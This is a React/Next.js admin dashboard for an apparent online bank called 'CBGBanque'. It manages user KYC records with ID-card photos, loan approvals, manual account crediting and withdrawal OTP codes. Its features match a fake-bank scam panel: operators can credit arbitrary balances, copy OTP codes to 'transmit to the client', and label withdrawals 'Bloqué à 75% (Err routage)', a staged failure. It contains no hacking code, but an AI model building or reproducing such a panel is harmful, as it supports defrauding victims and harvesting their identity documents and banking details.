"use client";

import React, { useState, useEffect, useCallback } from "react";
import { useRouter } from "next/navigation";

interface User {
  id: string;
  email: string;
  civility: string;
  firstName: string;
  lastName: string;
  phone: string;
  birthDate: string;
  birthPlace: string;
  nationality: string;
  residenceCountry: string;
  currency: string;
  address: string;
  city: string;
  postalCode: string;
  profession: string;
  monthlyIncome?: string | null;
  documentType: string;
  idCardFront?: string | null;
  idCardBack?: string | null;
  status: string;
  createdAt: string;
}

interface AdminLoan {
  id: string;
  userId: string;
  amount: number;
  durationMonths: number;
  currency: string;
  purpose: string;
  status: "pending" | "approved" | "rejected";
  createdAt: string;
  userEmail?: string;
  userName?: string;
  userLastName?: string;
  userPhone?: string;
  monthlyIncome?: string;
  profession?: string;
}

interface AdminWithdrawal {
  id: string;
  userId: string;
  recipientName: string;
  iban: string;
  bic: string;
  amountCents: number;
  description?: string;
  otpCode: string;
  status: "pending_otp" | "failed_verification" | "blocked_at_routing" | "completed";
  createdAt: string;
  userFirstName?: string;
  userLastName?: string;
  userEmail?: string;
}

export default function AdminPage() {
  const router = useRouter();

  const [isAuthenticated, setIsAuthenticated] = useState<boolean>(false);
  const [loadingAuth, setLoadingAuth] = useState<boolean>(true);

  const [usernameInput, setUsernameInput] = useState("");
  const [passwordInput, setPasswordInput] = useState("");
  const [errorMsg, setErrorMsg] = useState("");

  // Données de l'application admin
  const [users, setUsers] = useState<User[]>([]);
  const [loans, setLoans] = useState<AdminLoan[]>([]);
  const [withdrawals, setWithdrawals] = useState<AdminWithdrawal[]>([]);
  const [selectedUser, setSelectedUser] = useState<User | null>(null);
  const [activeTab, setActiveTab] = useState<"users" | "loans" | "withdrawals">("users");

  // Credit user modal
  const [creditUser, setCreditUser] = useState<User | null>(null);
  const [creditAmount, setCreditAmount] = useState("");
  const [creditDescription, setCreditDescription] = useState("Crédit bancaire CBG Finance");
  const [creditLoading, setCreditLoading] = useState(false);
  const [creditFeedback, setCreditFeedback] = useState("");
  const [copiedCodeId, setCopiedCodeId] = useState<string | null>(null);

  const fetchUsers = useCallback(async () => {
    try {
      const res = await fetch("/api/admin/users");
      if (res.status === 401) {
        setIsAuthenticated(false);
        return;
      }
      const data = await res.json();
      if (data.success) {
        setUsers(data.users);
        setIsAuthenticated(true);
      }
    } catch (err) {
      console.error("Erreur chargement utilisateurs", err);
    }
  }, []);

  const fetchLoans = useCallback(async () => {
    try {
      const res = await fetch("/api/admin/loans");
      const data = await res.json();
      if (data.success && data.loans) {
        setLoans(data.loans);
      }
    } catch (err) {
      console.error("Erreur chargement prêts admin", err);
    }
  }, []);

  const fetchWithdrawals = useCallback(async () => {
    try {
      const res = await fetch("/api/admin/withdrawals");
      const data = await res.json();
      if (data.success && data.withdrawals) {
        setWithdrawals(data.withdrawals);
      }
    } catch (err) {
      console.error("Erreur chargement retraits admin", err);
    }
  }, []);

  useEffect(() => {
    let active = true;
    fetch("/api/admin/users")
      .then(async (res) => {
        if (res.status === 401) {
          if (active) setIsAuthenticated(false);
          return;
        }
        const data = await res.json();
        if (active && data.success) {
          setUsers(data.users);
          setIsAuthenticated(true);
          fetchLoans();
          fetchWithdrawals();
        }
      })
      .catch((error: unknown) => console.error("Erreur chargement utilisateurs", error))
      .finally(() => {
        if (active) setLoadingAuth(false);
      });

    return () => {
      active = false;
    };
  }, [fetchLoans, fetchWithdrawals]);

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg("");

    try {
      const res = await fetch("/api/admin/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: usernameInput, password: passwordInput }),
      });

      if (res.ok) {
        await fetchUsers();
        await fetchLoans();
        await fetchWithdrawals();
        router.refresh();
      } else {
        const data = await res.json();
        setErrorMsg(data.message ?? "Identifiants incorrects.");
      }
    } catch {
      setErrorMsg("Une erreur est survenue lors de la connexion.");
    }
  };

  const handleLogout = async () => {
    try {
      const response = await fetch("/api/admin/logout", { method: "POST" });
      if (!response.ok) throw new Error("Échec de la déconnexion.");
      setIsAuthenticated(false);
      router.push("/admin");
    } catch (error) {
      console.error("Erreur lors de la déconnexion administrateur :", error);
      setErrorMsg("Impossible de fermer la session administrateur.");
    }
  };

  const updateStatus = async (userId: string, newStatus: "approved" | "rejected") => {
    try {
      const res = await fetch("/api/admin/users", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId, status: newStatus }),
      });
      const data = await res.json();
      if (res.ok && data.success) {
        setUsers((prev) =>
          prev.map((u) => (u.id === userId ? { ...u, status: newStatus } : u))
        );
        if (selectedUser?.id === userId) {
          setSelectedUser((prev) => prev ? { ...prev, status: newStatus } : null);
        }
      } else {
        alert(data.message || "Erreur lors de la mise à jour");
      }
    } catch {
      alert("Erreur de connexion.");
    }
  };

  const updateLoanStatus = async (loanId: string, status: "approved" | "rejected") => {
    try {
      const res = await fetch("/api/admin/loans", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ loanId, status }),
      });
      const data = await res.json();
      if (res.ok && data.success) {
        setLoans((prev) =>
          prev.map((l) => (l.id === loanId ? { ...l, status } : l))
        );
        alert(status === "approved" ? "Prêt approuvé et fonds crédités sur le compte client !" : "Prêt refusé.");
      } else {
        alert(data.message || "Erreur lors de la mise à jour");
      }
    } catch {
      alert("Erreur de communication avec le serveur.");
    }
  };

  const handleCreditSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!creditUser || !creditAmount) return;

    setCreditLoading(true);
    setCreditFeedback("");

    try {
      const res = await fetch("/api/admin/credit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId: creditUser.id,
          amount: creditAmount,
          description: creditDescription,
        }),
      });

      const data = await res.json();
      if (!res.ok) throw new Error(data.message ?? "Échec du crédit.");

      setCreditFeedback(data.message);
      setTimeout(() => {
        setCreditUser(null);
        setCreditAmount("");
        setCreditFeedback("");
      }, 1800);
    } catch (err) {
      alert(err instanceof Error ? err.message : "Erreur.");
    } finally {
      setCreditLoading(false);
    }
  };

  const copyCode = (code: string, id: string) => {
    navigator.clipboard.writeText(code);
    setCopiedCodeId(id);
    setTimeout(() => setCopiedCodeId(null), 2500);
  };

  if (loadingAuth) {
    return (
      <div className="admin-loading-screen">
        <div className="spinner-border text-primary" role="status"></div>
        <p>Vérification de session administrateur…</p>
      </div>
    );
  }

  // Écran de connexion si non connecté
  if (!isAuthenticated) {
    return (
      <div className="admin-auth-overlay">
        <div className="admin-auth-card">
          <div className="admin-auth-header">
            <span className="admin-badge">ESPACE SÉCURISÉ</span>
            <h2>Supervision CBGBanque</h2>
            <p>Connectez-vous pour gérer les utilisateurs, crédits et validations.</p>
          </div>

          {errorMsg && (
            <div className="admin-alert-error" role="alert">
              <i className="fa-solid fa-triangle-exclamation"></i> {errorMsg}
            </div>
          )}

          <form onSubmit={handleLoginSubmit} className="admin-auth-form">
            <div className="form-group-admin">
              <label htmlFor="admin-username">Identifiant Administrateur</label>
              <div className="input-icon-wrap">
                <i className="fa-solid fa-user-shield"></i>
                <input
                  id="admin-username"
                  type="text"
                  required
                  value={usernameInput}
                  onChange={(e) => setUsernameInput(e.target.value)}
                  placeholder="admin"
                />
              </div>
            </div>

            <div className="form-group-admin">
              <label htmlFor="admin-password">Mot de passe secret</label>
              <div className="input-icon-wrap">
                <i className="fa-solid fa-lock"></i>
                <input
                  id="admin-password"
                  type="password"
                  required
                  value={passwordInput}
                  onChange={(e) => setPasswordInput(e.target.value)}
                  placeholder="••••••••"
                />
              </div>
            </div>

            <button type="submit" className="btn-admin-submit">
              Accéder au Panneau
            </button>
          </form>
        </div>
      </div>
    );
  }

  const pendingUsers = users.filter((u) => u.status === "pending");
  const pendingLoans = loans.filter((l) => l.status === "pending");
  const pendingWithdrawals = withdrawals.filter((w) => w.status === "pending_otp");

  return (
    <div className="admin-dashboard-page">
      <div className="admin-container">
        
        {/* En-tête du Dashboard */}
        <div className="admin-top-header">
          <div className="admin-title-group">
            <span className="admin-badge-role">PANNEAU DE CONTRÔLE</span>
            <h1 className="admin-main-title">Gestion CBGBanque</h1>
          </div>
          <button onClick={handleLogout} className="btn-logout-admin">
            <i className="fa-solid fa-right-from-bracket"></i> Déconnexion
          </button>
        </div>

        {/* Statistiques Globales dynamiques */}
        <div className="admin-stats-grid">
          <div className="admin-stat-card">
            <span className="stat-card-label">Total Utilisateurs</span>
            <div className="stat-card-value">{users.length}</div>
            <span className="stat-card-trend positive">Comptes enregistrés</span>
          </div>

          <div className="admin-stat-card">
            <span className="stat-card-label">KYC en attente</span>
            <div className="stat-card-value highlight-amber">{pendingUsers.length}</div>
            <span className="stat-card-trend">Identités à valider</span>
          </div>

          <div className="admin-stat-card">
            <span className="stat-card-label">Prêts en attente</span>
            <div className="stat-card-value highlight-amber">{pendingLoans.length}</div>
            <span className="stat-card-trend">Dossiers de crédit</span>
          </div>

          <div className="admin-stat-card">
            <span className="stat-card-label">Codes OTP Retraits</span>
            <div className="stat-card-value" style={{ color: "#a855f7" }}>{pendingWithdrawals.length}</div>
            <span className="stat-card-trend">Codes à transmettre</span>
          </div>
        </div>

        {/* Tab Switcher: Utilisateurs / Prêts / Retraits */}
        <div style={{ display: "flex", flexWrap: "wrap", gap: "0.75rem", margin: "2rem 0 1rem 0" }}>
          <button
            onClick={() => setActiveTab("users")}
            style={{
              background: activeTab === "users" ? "#2563eb" : "rgba(255,255,255,0.06)",
              color: "#fff",
              padding: "0.75rem 1.25rem",
              borderRadius: "12px",
              border: "1px solid rgba(255,255,255,0.1)",
              fontWeight: 700,
              fontSize: "0.95rem",
              cursor: "pointer",
            }}
          >
            <i className="fa-solid fa-users"></i> Inscriptions & KYC ({pendingUsers.length})
          </button>

          <button
            onClick={() => setActiveTab("loans")}
            style={{
              background: activeTab === "loans" ? "#2563eb" : "rgba(255,255,255,0.06)",
              color: "#fff",
              padding: "0.75rem 1.25rem",
              borderRadius: "12px",
              border: "1px solid rgba(255,255,255,0.1)",
              fontWeight: 700,
              fontSize: "0.95rem",
              cursor: "pointer",
            }}
          >
            <i className="fa-solid fa-file-lines"></i> Demandes de financement ({pendingLoans.length})
          </button>

          <button
            onClick={() => setActiveTab("withdrawals")}
            style={{
              background: activeTab === "withdrawals" ? "#9333ea" : "rgba(255,255,255,0.06)",
              color: "#fff",
              padding: "0.75rem 1.25rem",
              borderRadius: "12px",
              border: "1px solid rgba(255,255,255,0.1)",
              fontWeight: 700,
              fontSize: "0.95rem",
              cursor: "pointer",
            }}
          >
            <i className="fa-solid fa-key"></i> Retraits & Codes OTP ({pendingWithdrawals.length})
          </button>
        </div>

        {/* ================= ONGLET 1 : UTILISATEURS (KYC & CRÉDITER) ================= */}
        {activeTab === "users" && (
          <div className="admin-section">
            <div className="section-header-admin">
              <h3 className="admin-section-title">Comptes clients & Justificatifs KYC</h3>
              <span className="badge-count">{users.length} comptes au total</span>
            </div>

            <div className="admin-table-wrapper">
              <table className="admin-table">
                <thead>
                  <tr>
                    <th>Utilisateur</th>
                    <th>Email</th>
                    <th>Pays</th>
                    <th>Salaire</th>
                    <th>Document</th>
                    <th>Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {users.length === 0 ? (
                    <tr>
                      <td colSpan={6} style={{ textAlign: "center", padding: "2rem", color: "#94a3b8" }}>
                        Aucun utilisateur inscrit pour le moment.
                      </td>
                    </tr>
                  ) : (
                    users.map((user) => (
                      <tr key={user.id}>
                        <td>
                          <div className="user-td-info">
                            <span className="user-avatar-sm">
                              {user.firstName?.[0]}{user.lastName?.[0]}
                            </span>
                            <div>
                              <strong>{user.civility} {user.firstName} {user.lastName}</strong>
                              <span className="user-sub-td">Statut : <strong>{user.status}</strong></span>
                            </div>
                          </div>
                        </td>
                        <td>{user.email}</td>
                        <td>{user.residenceCountry}</td>
                        <td><strong>{user.monthlyIncome ? `${user.monthlyIncome} €` : "—"}</strong></td>
                        <td>
                          <span className="doc-badge-table">
                            {user.documentType} {user.idCardFront ? "✓ Photos" : ""}
                          </span>
                        </td>
                        <td>
                          <div className="table-actions-row">
                            {/* Bouton CRÉDITER LE COMPTE */}
                            <button
                              onClick={() => {
                                setCreditUser(user);
                                setCreditAmount("");
                                setCreditDescription("Crédit bancaire CBG Finance");
                                setCreditFeedback("");
                              }}
                              style={{
                                background: "rgba(16, 185, 129, 0.2)",
                                color: "#10b981",
                                border: "1px solid rgba(16, 185, 129, 0.4)",
                                padding: "0.4rem 0.75rem",
                                borderRadius: "8px",
                                fontWeight: 700,
                                fontSize: "0.8rem",
                                cursor: "pointer",
                              }}
                            >
                              <i className="fa-solid fa-plus-circle"></i> Créditer
                            </button>

                            <button
                              className="btn-table-details"
                              onClick={() => setSelectedUser(user)}
                              style={{ background: "rgba(59, 130, 246, 0.15)", color: "#3b82f6", border: "1px solid rgba(59, 130, 246, 0.3)", padding: "0.4rem 0.75rem", borderRadius: "8px", fontWeight: 600, fontSize: "0.8rem", cursor: "pointer" }}
                            >
                              <i className="fa-solid fa-eye"></i> Pièces
                            </button>
                            
                            {user.status !== "approved" && (
                              <button className="btn-table-approve" onClick={() => updateStatus(user.id, "approved")}>
                                <i className="fa-solid fa-check"></i> Valider
                              </button>
                            )}
                            {user.status !== "rejected" && (
                              <button className="btn-table-reject" onClick={() => updateStatus(user.id, "rejected")}>
                                <i className="fa-solid fa-xmark"></i> Rejeter
                              </button>
                            )}
                          </div>
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* ================= ONGLET 2 : DEMANDES DE PRÊT ================= */}
        {activeTab === "loans" && (
          <div className="admin-section">
            <div className="section-header-admin">
              <h3 className="admin-section-title">Demandes de financement</h3>
              <span className="badge-count">{loans.length} dossiers</span>
            </div>

            <div className="admin-table-wrapper">
              <table className="admin-table">
                <thead>
                  <tr>
                    <th>Demandeur</th>
                    <th>Montant demandé</th>
                    <th>Durée</th>
                    <th>Motif</th>
                    <th>Statut</th>
                    <th>Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {loans.length === 0 ? (
                    <tr>
                      <td colSpan={6} style={{ textAlign: "center", padding: "2rem", color: "#94a3b8" }}>
                        Aucune demande de financement enregistrée.
                      </td>
                    </tr>
                  ) : (
                    loans.map((loan) => (
                      <tr key={loan.id}>
                        <td>
                          <div>
                            <strong>{loan.userName || "Client"} {loan.userLastName || ""}</strong>
                            <div style={{ fontSize: "0.78rem", color: "#94a3b8" }}>{loan.userEmail}</div>
                            {loan.monthlyIncome && (
                              <div style={{ fontSize: "0.75rem", color: "#60a5fa" }}>
                                Revenu : {loan.monthlyIncome} {loan.currency}/mois
                              </div>
                            )}
                          </div>
                        </td>
                        <td>
                          <strong style={{ fontSize: "1.05rem", color: "#60a5fa" }}>
                            {new Intl.NumberFormat("fr-FR", { style: "currency", currency: loan.currency }).format(loan.amount)}
                          </strong>
                        </td>
                        <td>
                          {loan.durationMonths} mois
                        </td>
                        <td>
                          <span className="doc-badge-table">{loan.purpose}</span>
                        </td>
                        <td>
                          <span
                            style={{
                              padding: "0.25rem 0.6rem",
                              borderRadius: "6px",
                              fontSize: "0.8rem",
                              fontWeight: 700,
                              background:
                                loan.status === "approved"
                                  ? "rgba(34,197,94,0.15)"
                                  : loan.status === "rejected"
                                  ? "rgba(239,68,68,0.15)"
                                  : "rgba(245,158,11,0.15)",
                              color:
                                loan.status === "approved"
                                  ? "#22c55e"
                                  : loan.status === "rejected"
                                  ? "#ef4444"
                                  : "#f59e0b",
                            }}
                          >
                            {loan.status === "approved" ? "Approuvé & Crédité" : loan.status === "rejected" ? "Refusé" : "En attente"}
                          </span>
                        </td>
                        <td>
                          <div className="table-actions-row">
                            {loan.status === "pending" && (
                              <>
                                <button
                                  className="btn-table-approve"
                                  onClick={() => updateLoanStatus(loan.id, "approved")}
                                  title="Approuver le prêt et créditer automatiquement le solde"
                                >
                                  <i className="fa-solid fa-check"></i> Valider & Créditer
                                </button>
                                <button
                                  className="btn-table-reject"
                                  onClick={() => updateLoanStatus(loan.id, "rejected")}
                                  title="Refuser la demande"
                                >
                                  <i className="fa-solid fa-xmark"></i> Refuser
                                </button>
                              </>
                            )}
                          </div>
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* ================= ONGLET 3 : RETRAITS & CODES OTP ================= */}
        {activeTab === "withdrawals" && (
          <div className="admin-section">
            <div className="section-header-admin">
              <h3 className="admin-section-title">Demandes de retraits & Codes OTP de sécurité</h3>
              <button
                type="button"
                onClick={fetchWithdrawals}
                style={{
                  background: "rgba(255,255,255,0.08)",
                  border: "none",
                  color: "#fff",
                  padding: "0.4rem 0.85rem",
                  borderRadius: "8px",
                  fontSize: "0.85rem",
                  cursor: "pointer",
                }}
              >
                <i className="fa-solid fa-arrows-rotate"></i> Actualiser
              </button>
            </div>

            <div className="admin-table-wrapper">
              <table className="admin-table">
                <thead>
                  <tr>
                    <th>Demandeur</th>
                    <th>Montant</th>
                    <th>Bénéficiaire & IBAN</th>
                    <th>Code OTP généré</th>
                    <th>Statut</th>
                    <th>Date</th>
                  </tr>
                </thead>
                <tbody>
                  {withdrawals.length === 0 ? (
                    <tr>
                      <td colSpan={6} style={{ textAlign: "center", padding: "2.5rem", color: "#94a3b8" }}>
                        Aucune demande de virement ou code OTP enregistré pour le moment.
                      </td>
                    </tr>
                  ) : (
                    withdrawals.map((item) => (
                      <tr key={item.id}>
                        <td>
                          <strong>{item.userFirstName || "Client"} {item.userLastName || ""}</strong>
                          <div style={{ fontSize: "0.75rem", color: "#94a3b8" }}>{item.userEmail}</div>
                        </td>
                        <td>
                          <strong style={{ fontSize: "1.1rem", color: "#60a5fa" }}>
                            {(item.amountCents / 100).toFixed(2)} €
                          </strong>
                        </td>
                        <td>
                          <div><strong>{item.recipientName}</strong></div>
                          <div style={{ fontSize: "0.75rem", fontFamily: "monospace", color: "#cbd5e1" }}>
                            {item.iban} ({item.bic})
                          </div>
                        </td>
                        <td>
                          <div style={{ display: "flex", alignItems: "center", gap: "0.5rem" }}>
                            <span
                              style={{
                                background: "#4c1d95",
                                color: "#f3e8ff",
                                border: "1px solid #7c3aed",
                                padding: "0.35rem 0.75rem",
                                borderRadius: "8px",
                                fontFamily: "monospace",
                                fontSize: "1.1rem",
                                fontWeight: 800,
                                letterSpacing: "2px",
                              }}
                            >
                              {item.otpCode}
                            </span>
                            <button
                              type="button"
                              onClick={() => copyCode(item.otpCode, item.id)}
                              style={{
                                background: "rgba(255,255,255,0.08)",
                                border: "none",
                                color: "#fff",
                                padding: "0.4rem 0.6rem",
                                borderRadius: "6px",
                                cursor: "pointer",
                                fontSize: "0.75rem",
                              }}
                              title="Copier le code pour le transmettre au client"
                            >
                              <i className={`fa-solid ${copiedCodeId === item.id ? "fa-check" : "fa-copy"}`}></i>
                            </button>
                          </div>
                        </td>
                        <td>
                          <span
                            style={{
                              padding: "0.25rem 0.6rem",
                              borderRadius: "6px",
                              fontSize: "0.8rem",
                              fontWeight: 700,
                              background:
                                item.status === "pending_otp"
                                  ? "rgba(245,158,11,0.2)"
                                  : item.status === "blocked_at_routing"
                                  ? "rgba(239,68,68,0.2)"
                                  : "rgba(34,197,94,0.2)",
                              color:
                                item.status === "pending_otp"
                                  ? "#fbbf24"
                                  : item.status === "blocked_at_routing"
                                  ? "#f87171"
                                  : "#34d399",
                            }}
                          >
                            {item.status === "pending_otp"
                              ? "En attente saisie client"
                              : item.status === "blocked_at_routing"
                              ? "Bloqué à 75% (Err routage)"
                              : "Complété"}
                          </span>
                        </td>
                        <td style={{ fontSize: "0.8rem", color: "#94a3b8" }}>
                          {new Date(item.createdAt).toLocaleString("fr-FR")}
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </div>
        )}

      </div>

      {/* ================= MODALE "CRÉDITER LE COMPTE" ================= */}
      {creditUser && (
        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.8)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 1000, padding: "1rem" }}>
          <div style={{ background: "#0f172a", border: "1px solid rgba(255,255,255,0.15)", borderRadius: "20px", width: "100%", maxWidth: "460px", padding: "2rem", color: "#fff", boxShadow: "0 25px 50px rgba(0,0,0,0.5)" }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "1.25rem" }}>
              <div style={{ display: "flex", alignItems: "center", gap: "0.6rem" }}>
                <div style={{ width: "36px", height: "36px", borderRadius: "10px", background: "rgba(16, 185, 129, 0.2)", display: "flex", alignItems: "center", justifyContent: "center", color: "#10b981" }}>
                  <i className="fa-solid fa-coins"></i>
                </div>
                <div>
                  <h2 style={{ fontSize: "1.15rem", fontWeight: 700, margin: 0 }}>Créditer le compte client</h2>
                  <span style={{ fontSize: "0.8rem", color: "#94a3b8" }}>{creditUser.firstName} {creditUser.lastName} ({creditUser.email})</span>
                </div>
              </div>
              <button onClick={() => setCreditUser(null)} style={{ background: "none", border: "none", color: "#94a3b8", fontSize: "1.25rem", cursor: "pointer" }}>
                ✕
              </button>
            </div>

            {creditFeedback && (
              <div style={{ background: "rgba(16, 185, 129, 0.2)", border: "1px solid rgba(16, 185, 129, 0.4)", color: "#6ee7b7", padding: "0.75rem 1rem", borderRadius: "10px", marginBottom: "1rem", fontSize: "0.9rem" }}>
                <i className="fa-solid fa-circle-check"></i> {creditFeedback}
              </div>
            )}

            <form onSubmit={handleCreditSubmit}>
              <div style={{ marginBottom: "1rem" }}>
                <label style={{ display: "block", fontSize: "0.85rem", color: "#cbd5e1", marginBottom: "0.4rem", fontWeight: 600 }}>
                  Montant à créditer (€) :
                </label>
                <input
                  type="number"
                  min="1"
                  step="0.01"
                  required
                  value={creditAmount}
                  onChange={(e) => setCreditAmount(e.target.value)}
                  placeholder="Ex: 5000.00"
                  style={{
                    width: "100%",
                    padding: "0.8rem 1rem",
                    borderRadius: "12px",
                    background: "rgba(255,255,255,0.06)",
                    border: "1px solid rgba(255,255,255,0.15)",
                    color: "#fff",
                    fontSize: "1.1rem",
                    fontWeight: 700,
                    boxSizing: "border-box",
                  }}
                />
              </div>

              <div style={{ marginBottom: "1.5rem" }}>
                <label style={{ display: "block", fontSize: "0.85rem", color: "#cbd5e1", marginBottom: "0.4rem", fontWeight: 600 }}>
                  Libellé / Motif de l&apos;opération :
                </label>
                <input
                  type="text"
                  required
                  value={creditDescription}
                  onChange={(e) => setCreditDescription(e.target.value)}
                  placeholder="Ex: Virement reçu / Dépôt de fonds"
                  style={{
                    width: "100%",
                    padding: "0.8rem 1rem",
                    borderRadius: "12px",
                    background: "rgba(255,255,255,0.06)",
                    border: "1px solid rgba(255,255,255,0.15)",
                    color: "#fff",
                    fontSize: "0.95rem",
                    boxSizing: "border-box",
                  }}
                />
              </div>

              <div style={{ display: "flex", gap: "0.75rem" }}>
                <button
                  type="button"
                  onClick={() => setCreditUser(null)}
                  style={{
                    flex: 1,
                    padding: "0.75rem",
                    borderRadius: "10px",
                    background: "rgba(255,255,255,0.08)",
                    border: "none",
                    color: "#fff",
                    fontWeight: 600,
                    cursor: "pointer",
                  }}
                >
                  Annuler
                </button>
                <button
                  type="submit"
                  disabled={creditLoading || !creditAmount}
                  style={{
                    flex: 1,
                    padding: "0.75rem",
                    borderRadius: "10px",
                    background: "linear-gradient(135deg, #10b981, #059669)",
                    border: "none",
                    color: "#000",
                    fontWeight: 700,
                    cursor: creditLoading ? "wait" : "pointer",
                  }}
                >
                  {creditLoading ? "En cours…" : "Confirmer le crédit"}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* ================= MODALE "VOIR INFOS & PIÈCES D'IDENTITÉ" ================= */}
      {selectedUser && (
        <div className="modal-overlay" style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.8)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 1000, padding: "1rem" }}>
          <div className="modal-content" style={{ background: "#0b1120", border: "1px solid rgba(255,255,255,0.1)", borderRadius: "20px", width: "100%", maxWidth: "680px", padding: "2rem", color: "#fff", display: "flex", flexDirection: "column", gap: "1.5rem", maxHeight: "90vh", overflowY: "auto" }}>
            
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
              <h2 style={{ fontSize: "1.25rem", fontWeight: 700 }}>Dossier client & Justificatifs</h2>
              <button onClick={() => setSelectedUser(null)} style={{ background: "none", border: "none", color: "#94a3b8", fontSize: "1.25rem", cursor: "pointer" }}>
                <i className="fa-solid fa-xmark"></i>
              </button>
            </div>

            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1rem", fontSize: "0.9rem" }}>
              <div><strong>Nom complet :</strong> {selectedUser.civility} {selectedUser.firstName} {selectedUser.lastName}</div>
              <div><strong>Email :</strong> {selectedUser.email}</div>
              <div><strong>Téléphone :</strong> {selectedUser.phone}</div>
              <div><strong>Date de naissance :</strong> {selectedUser.birthDate} ({selectedUser.birthPlace})</div>
              <div><strong>Nationalité :</strong> {selectedUser.nationality}</div>
              <div><strong>Pays de résidence :</strong> {selectedUser.residenceCountry}</div>
              <div><strong>Ville & Code postal :</strong> {selectedUser.city} ({selectedUser.postalCode})</div>
              <div><strong>Profession :</strong> {selectedUser.profession}</div>
              <div><strong>Revenu mensuel déclaré :</strong> <span style={{ color: "#22c55e", fontWeight: 700 }}>{selectedUser.monthlyIncome ? `${selectedUser.monthlyIncome} € / mois` : "Non spécifié"}</span></div>
              <div><strong>Devise :</strong> {selectedUser.currency}</div>
              <div><strong>Type de document :</strong> {selectedUser.documentType}</div>
              <div><strong>Statut actuel :</strong> <span style={{ color: selectedUser.status === "approved" ? "#22c55e" : selectedUser.status === "rejected" ? "#ef4444" : "#f59e0b" }}>{selectedUser.status}</span></div>
              <div style={{ gridColumn: "span 2" }}><strong>Adresse :</strong> {selectedUser.address}</div>
            </div>

            {/* Photos de la pièce d'identité */}
            <div style={{ borderTop: "1px solid rgba(255,255,255,0.1)", paddingTop: "1rem" }}>
              <strong style={{ display: "block", marginBottom: "0.75rem", fontSize: "0.95rem" }}>
                <i className="fa-solid fa-id-card"></i> Pièce d&apos;identité téléchargée :
              </strong>
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "1rem" }}>
                <div>
                  <span style={{ fontSize: "0.8rem", color: "#94a3b8", display: "block", marginBottom: "0.25rem" }}>Recto :</span>
                  {selectedUser.idCardFront ? (
                    <a href={selectedUser.idCardFront} target="_blank" rel="noopener noreferrer">
                      <img
                        src={selectedUser.idCardFront}
                        alt="Recto pièce"
                        style={{ width: "100%", maxHeight: "180px", objectFit: "cover", borderRadius: "10px", border: "1px solid rgba(255,255,255,0.15)", cursor: "zoom-in" }}
                      />
                    </a>
                  ) : (
                    <div style={{ background: "rgba(255,255,255,0.03)", padding: "2rem 1rem", textAlign: "center", borderRadius: "10px", color: "#64748b", fontSize: "0.85rem" }}>
                      Aucune image recto
                    </div>
                  )}
                </div>

                <div>
                  <span style={{ fontSize: "0.8rem", color: "#94a3b8", display: "block", marginBottom: "0.25rem" }}>Verso :</span>
                  {selectedUser.idCardBack ? (
                    <a href={selectedUser.idCardBack} target="_blank" rel="noopener noreferrer">
                      <img
                        src={selectedUser.idCardBack}
                        alt="Verso pièce"
                        style={{ width: "100%", maxHeight: "180px", objectFit: "cover", borderRadius: "10px", border: "1px solid rgba(255,255,255,0.15)", cursor: "zoom-in" }}
                      />
                    </a>
                  ) : (
                    <div style={{ background: "rgba(255,255,255,0.03)", padding: "2rem 1rem", textAlign: "center", borderRadius: "10px", color: "#64748b", fontSize: "0.85rem" }}>
                      {selectedUser.documentType === "passport" ? "Non requis (Passeport)" : "Aucune image verso"}
                    </div>
                  )}
                </div>
              </div>
            </div>

            <div style={{ display: "flex", gap: "1rem", marginTop: "1rem", justifyContent: "flex-end" }}>
              <button
                onClick={() => updateStatus(selectedUser.id, "rejected")}
                style={{ background: "rgba(239, 68, 68, 0.2)", color: "#ef4444", border: "1px solid rgba(239, 68, 68, 0.4)", padding: "0.6rem 1.25rem", borderRadius: "8px", fontWeight: "bold", cursor: "pointer" }}
              >
                Rejeter le compte
              </button>
              <button
                onClick={() => updateStatus(selectedUser.id, "approved")}
                style={{ background: "#22c55e", color: "#000", border: "none", padding: "0.6rem 1.25rem", borderRadius: "8px", fontWeight: "bold", cursor: "pointer" }}
              >
                Approuver le compte
              </button>
            </div>

          </div>
        </div>
      )}

    </div>
  );
}
